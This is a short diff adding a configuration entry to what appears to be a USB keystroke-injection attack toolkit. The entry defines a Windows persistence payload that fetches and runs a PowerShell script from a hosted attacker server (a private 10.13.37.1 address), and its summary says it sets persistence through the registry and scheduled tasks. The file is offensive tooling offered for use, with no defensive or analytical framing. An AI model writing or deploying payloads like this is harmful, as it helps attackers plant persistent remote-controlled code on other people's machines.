@@ -1,0 +1,8 @@
+name: win_persist_wrapper
+group: hid
+summary: Runs your hosted persistence script (registry, schtasks, etc)
+script: payloads/hid/win_persist_wrapper.py
+env:
+  P4WN_PERSIST_PS_URL: "http://10.13.37.1/payloads/www/private/persist.ps1"
+  P4WN_PERSIST_PS_ARGS: ""
+
